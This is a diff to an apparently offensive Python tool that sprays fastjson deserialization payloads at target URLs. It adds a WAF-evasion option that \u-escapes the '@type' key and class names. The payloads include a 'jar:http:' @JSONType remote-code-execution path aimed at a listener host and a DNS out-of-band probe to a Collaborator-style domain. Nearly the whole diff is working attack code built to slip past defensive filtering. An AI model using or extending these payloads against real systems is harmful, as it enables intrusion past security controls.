@@ -52,12 +52,25 @@ def make_type(host, port, token, entry="POC"):
     return f"jar:http:..{host}:{port}.{token}!.{entry}"
 
 
-def make_dns_obj(collab_raw, token):
+def uesc(s):
+    return "".join("\\u%04x" % ord(c) for c in s)
+
+
+def atype_key(evasion):
+    # fastjson's lexer decodes \uXXXX in field names, so an escaped "@type" still binds
+    # but a keyword-matching WAF misses it.
+    return uesc("@type") if evasion in ("ukey", "both") else "@type"
+
+
+def make_dns_obj(collab_raw, token, evasion="none"):
     # OOB probe via a fastjson primitive that ACCEPTS a dotted hostname (unlike the
     # @JSONType jar: sink). Works with autoType off; confirms fastjson processes @type
     # AND the host has egress. Fires a Burp Collaborator / interactsh DNS interaction
     # for "<token>.<collab>". Not RCE — a prerequisite/reachability signal.
-    return '{"@type":"java.net.Inet4Address","val":"%s.%s"}' % (token, collab_raw)
+    cls = "java.net.Inet4Address"
+    if evasion in ("uval", "both"):
+        cls = uesc(cls)
+    return '{"%s":"%s","val":"%s.%s"}' % (atype_key(evasion), cls, token, collab_raw)
 
 
 def slug(url):
@@ -155,6 +168,9 @@ def main(argv):
                     help="jsontype = @JSONType jar: RCE-path (int-IP; needs a raw-IP listener); "
                          "dns = Inet4Address OOB via a DOTTED host (Collaborator-compatible, "
                          "confirms fastjson+egress); both = send each")
+    ap.add_argument("--evasion", choices=["none", "ukey", "uval", "both"], default="none",
+                    help="WAF evasion via \\uXXXX escaping (fastjson still decodes it): "
+                         "ukey=escape the @type key, uval=escape the class/value, both")
     ap.add_argument("--content-type", default="application/json")
     ap.add_argument("--user-agent",
                     default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -193,12 +209,15 @@ def main(argv):
         base = "%s%s" % (slug(url), os.urandom(2).hex())
         if args.probe_type in ("jsontype", "both"):
             tok = "j" + base
-            obj = '{"@type":"%s","x":1}' % make_type(host, port, tok)
+            typ = make_type(host, port, tok)
+            if args.evasion in ("uval", "both"):
+                typ = uesc(typ)
+            obj = '{"%s":"%s","x":1}' % (atype_key(args.evasion), typ)
             token_map[tok] = (method, url, "jsontype")
             jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
         if args.probe_type in ("dns", "both"):
             tok = "d" + base
-            obj = make_dns_obj(collab_raw, tok)
+            obj = make_dns_obj(collab_raw, tok, args.evasion)
             token_map[tok] = (method, url, "dns")
             jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
         if args.baseline:
